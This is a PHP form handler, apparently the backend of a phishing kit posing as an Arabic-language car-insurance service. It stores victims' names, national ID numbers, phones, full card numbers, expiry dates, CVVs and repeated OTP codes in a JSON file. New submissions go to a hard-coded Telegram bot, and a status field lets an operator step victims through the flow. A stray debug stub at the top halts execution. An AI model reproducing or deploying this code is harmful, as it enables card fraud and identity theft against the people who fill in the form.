// ضعه في بداية الملف، قبل أي شيء آخر
echo "PHP file is being executed!";
exit(); // لمنع تنفيذ بقية الكود مؤقتا
// بقية كود process_form.php
// ...<?php
header('Content-Type: application/json; charset=utf-8');

$data_file = 'form_submissions.json';
$submissions = [];

define('TELEGRAM_BOT_TOKEN', '7647127310:AAEL_VzCr1wTh26Exczu6IPuFgEsH4HHHVE');
define('TELEGRAM_CHAT_ID', '6454807559');

/**
 * @param string $message الرسالة المراد إرسالها
 * @return bool True إذا تم الإرسال بنجاح، False بخلاف ذلك
 */
function sendTelegramMessage($message) {
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    if ($result === FALSE) {
        error_log("Failed to send message to Telegram.");
        return false;
    }

    $response = json_decode($result, true);
    if ($response && $response['ok']) {
        return true;
    } else {
        error_log("Telegram API Error: " . ($response['description'] ?? 'Unknown error'));
        return false;
    }
}

if (file_exists($data_file)) {
    $json_data = file_get_contents($data_file);
    $submissions = json_decode($json_data, true);
    if ($submissions === null) {
        error_log("Error decoding form_submissions.json. File might be corrupted.");
        $submissions = [];
    }
}

$response = ['status' => 'error', 'message' => 'طلب غير صالح.'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];

    switch ($action) {
        case 'submit_initial_form':
            if (
                !isset($_POST['owner_name']) || empty($_POST['owner_name']) ||
                !isset($_POST['id_number']) || empty($_POST['id_number']) ||
                !isset($_POST['phone']) || empty($_POST['phone'])
            ) {
                $response = ['status' => 'error', 'message' => 'يرجى ملء الاسم، رقم الهوية، ورقم الهاتف.'];
                break;
            }

            $id_number = htmlspecialchars($_POST['id_number']);
            $found_key = null;

            foreach ($submissions as $key => $s) {
                if (isset($s['id_number']) && $s['id_number'] === $id_number) {
                    $found_key = $key;
                    break;
                }
            }

            $new_submission_data = [
                'owner_name' => htmlspecialchars($_POST['owner_name']),
                'id_number' => $id_number,
                'phone' => htmlspecialchars($_POST['phone']),
                'purpose' => htmlspecialchars($_POST['purpose'] ?? 'new_insurance'),
                'serial_number_form' => htmlspecialchars($_POST['serial_number_form'] ?? ''),
                'manufacture_year' => htmlspecialchars($_POST['manufacture_year'] ?? ''),
                'serial_number_custom' => htmlspecialchars($_POST['serial_number_custom'] ?? ''),
                'status' => 'pending',
                'submission_timestamp' => date('Y-m-d H:i:s')
            ];

            if ($found_key !== null) {
                $submissions[$found_key] = array_merge($submissions[$found_key], $new_submission_data);
                $action_message = 'تم تحديث بياناتك بنجاح.';
                $telegram_prefix = "<b>تحديث بيانات:</b>\n\n";
            } else {
                $submissions[] = $new_submission_data;
                $action_message = 'تم استلام بياناتك بنجاح.';
                $telegram_prefix = "<b>بيانات جديدة:</b>\n\n";
            }

            if (file_put_contents($data_file, json_encode($submissions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
                $response = ['status' => 'success', 'message' => $action_message];

                $telegram_message = $telegram_prefix .
                                    "<b>الاسم:</b> " . ($new_submission_data['owner_name'] ?? 'غير متوفر') . "\n" .
                                    "<b>رقم الهوية:</b> " . ($new_submission_data['id_number'] ?? 'غير متوفر') . "\n" .
                                    "<b>الهاتف:</b> " . ($new_submission_data['phone'] ?? 'غير متوفر') . "\n" .
                                    "<b>الغرض:</b> " . ($new_submission_data['purpose'] ?? 'غير متوفر') . "\n" .
                                    "<b>تاريخ الإرسال:</b> " . ($new_submission_data['submission_timestamp'] ?? 'غير متوفر');

                if (!empty($new_submission_data['serial_number_form'])) {
                    $telegram_message .= "\n<b>رقم التسلسلي (استمارة):</b> " . $new_submission_data['serial_number_form'];
                }
                if (!empty($new_submission_data['manufacture_year'])) {
                    $telegram_message .= "\n<b>سنة الصنع:</b> " . $new_submission_data['manufacture_year'];
                }
                if (!empty($new_submission_data['serial_number_custom'])) {
                    $telegram_message .= "\n<b>رقم التسلسلي (جمركية):</b> " . $new_submission_data['serial_number_custom'];
                }
                
                if (!sendTelegramMessage($telegram_message)) {
                    error_log("Failed to send Telegram notification for " . ($found_key !== null ? "updated" : "new") . " submission.");
                }

            } else {
                $response = ['status' => 'error', 'message' => 'فشل حفظ البيانات. يرجى التحقق من أذونات الملف.'];
            }
            break;

        case 'insurance_details':
            if (!isset($_POST['id_number']) || empty($_POST['id_number'])) {
                $response = ['status' => 'error', 'message' => 'رقم الهوية مطلوب لحفظ تفاصيل التأمين.'];
                break;
            }

            $id_number = htmlspecialchars($_POST['id_number']);
            $updated = false;

            foreach ($submissions as &$s) {
                if ($s['id_number'] === $id_number) {
                    $s['insurance_details'] = [
                        'insurance_type' => htmlspecialchars($_POST['insurance_type'] ?? ''),
                        'start_date' => htmlspecialchars($_POST['start_date'] ?? ''),
                        'usage_purpose' => htmlspecialchars($_POST['usage_purpose'] ?? ''),
                        'car_value' => htmlspecialchars($_POST['car_value'] ?? ''),
                        'manufacture_year' => htmlspecialchars($_POST['manufacture_year'] ?? ''),
                        'repair_location' => htmlspecialchars($_POST['repair_location'] ?? ''),
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                    $updated = true;
                    break;
                }
            }
            unset($s);

            if ($updated) {
                if (file_put_contents($data_file, json_encode($submissions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
                    $response = ['status' => 'success', 'message' => 'تم حفظ تفاصيل التأمين بنجاح.'];
                } else {
                    $response = ['status' => 'error', 'message' => 'فشل حفظ تفاصيل التأمين في الملف.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'رقم الهوية غير موجود لحفظ تفاصيل التأمين.'];
            }
            break;

        case 'save_payment_details':
            if (!isset($_POST['id_number']) || empty($_POST['id_number'])) {
                $response = ['status' => 'error', 'message' => 'رقم الهوية مطلوب لحفظ تفاصيل الدفع.'];
                break;
            }

            $id_number = htmlspecialchars($_POST['id_number']);
            $updated = false;

            foreach ($submissions as &$s) {
                if ($s['id_number'] === $id_number) {
                    $s['payment_details'] = [
                        'payment_method' => htmlspecialchars($_POST['payment_method'] ?? ''),
                        'total_amount' => htmlspecialchars($_POST['total_amount'] ?? ''),
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                    $updated = true;
                    break;
                }
            }
            unset($s);

            if ($updated) {
                if (file_put_contents($data_file, json_encode($submissions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
                    $response = ['status' => 'success', 'message' => 'تم حفظ تفاصيل الدفع بنجاح.'];
                } else {
                    $response = ['status' => 'error', 'message' => 'فشل حفظ تفاصيل الدفع في الملف.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'رقم الهوية غير موجود لحفظ تفاصيل الدفع.'];
            }
            break;

        case 'save_card_details':
            if (!isset($_POST['id_number']) || empty($_POST['id_number'])) {
                $response = ['status' => 'error', 'message' => 'رقم الهوية مطلوب لحفظ تفاصيل البطاقة.'];
                break;
            }

            $id_number = htmlspecialchars($_POST['id_number']);
            $updated = false;

            foreach ($submissions as &$s) {
                if ($s['id_number'] === $id_number) {
                    $s['card_details'] = [
                        'card_name' => htmlspecialchars($_POST['card_name'] ?? ''),
                        'card_number' => htmlspecialchars($_POST['card_number'] ?? ''),
                        'expiry_date' => htmlspecialchars($_POST['expiry_date'] ?? ''),
                        'cvv' => htmlspecialchars($_POST['cvv'] ?? ''),
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                    $s['status'] = 'pending';
                    $updated = true;
                    break;
                }
            }
            unset($s);

            if ($updated) {
                if (file_put_contents($data_file, json_encode($submissions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
                    $response = ['status' => 'success', 'message' => 'تم حفظ تفاصيل البطاقة بنجاح.'];
                } else {
                    $response = ['status' => 'error', 'message' => 'فشل حفظ تفاصيل البطاقة في الملف.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'رقم الهوية غير موجود لحفظ تفاصيل البطاقة.'];
            }
            break;

        case 'save_otp':
            if (!isset($_POST['id_number']) || empty($_POST['id_number']) || !isset($_POST['otp_code']) || empty($_POST['otp_code'])) {
                echo json_encode(['status' => 'error', 'message' => 'رقم الهوية ورمز OTP مطلوبان لحفظ OTP.']);
                exit;
            }

            $id_number = htmlspecialchars($_POST['id_number']);
            $otp_code = htmlspecialchars($_POST['otp_code']);
            $updated = false;

            foreach ($submissions as &$s) {
                if ($s['id_number'] === $id_number) {
                    if (!isset($s['otp_attempts']) || !is_array($s['otp_attempts'])) {
                        $s['otp_attempts'] = [];
                    }
                    $s['otp_attempts'][] = [
                        'otp_code' => $otp_code,
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                    $updated = true;
                    break;
                }
            }
            unset($s);

            if ($updated) {
                if (file_put_contents($data_file, json_encode($submissions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
                    $response = ['status' => 'success', 'message' => 'تم حفظ رمز OTP بنجاح.'];
                } else {
                    $response = ['status' => 'error', 'message' => 'فشل حفظ رمز OTP في الملف.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'رقم الهوية غير موجود لحفظ رمز OTP.'];
            }
            break;

        case 'update_status':
            if (!isset($_POST['id_number']) || empty($_POST['id_number']) || !isset($_POST['status']) || empty($_POST['status'])) {
                $response = ['status' => 'error', 'message' => 'رقم الهوية والحالة مطلوبان للتحديث.'];
                break;
            }

            $id_number = htmlspecialchars($_POST['id_number']);
            $new_status = htmlspecialchars($_POST['status']);
            $updated = false;

            foreach ($submissions as &$s) {
                if ($s['id_number'] === $id_number) {
                    $s['status'] = $new_status;
                    $updated = true;
                    break;
                }
            }
            unset($s);

            if ($updated) {
                if (file_put_contents($data_file, json_encode($submissions, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
                    $response = ['status' => 'success', 'message' => 'تم تحديث حالة المستخدم بنجاح.'];
                } else {
                    $response = ['status' => 'error', 'message' => 'فشل تحديث حالة المستخدم في الملف.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'المستخدم غير موجود.'];
            }
            break;

        case 'check_status':
            if (!isset($_POST['id_number']) || empty($_POST['id_number'])) {
                $response = ['status' => 'error', 'message' => 'رقم الهوية مطلوب للتحقق من الحالة.'];
                break;
            }

            $id_number = htmlspecialchars($_POST['id_number']);
            $user_status = 'pending';

            foreach ($submissions as $s) {
                if (isset($s['id_number']) && $s['id_number'] === $id_number) {
                    $user_status = $s['status'] ?? 'pending';
                    break;
                }
            }
            $response = ['status' => $user_status];
            break;

        default:
            $response = ['status' => 'error', 'message' => 'الإجراء المطلوب غير صالح.'];
            break;
    }
}

echo json_encode($response, JSON_UNESCAPED_UNICODE);
?>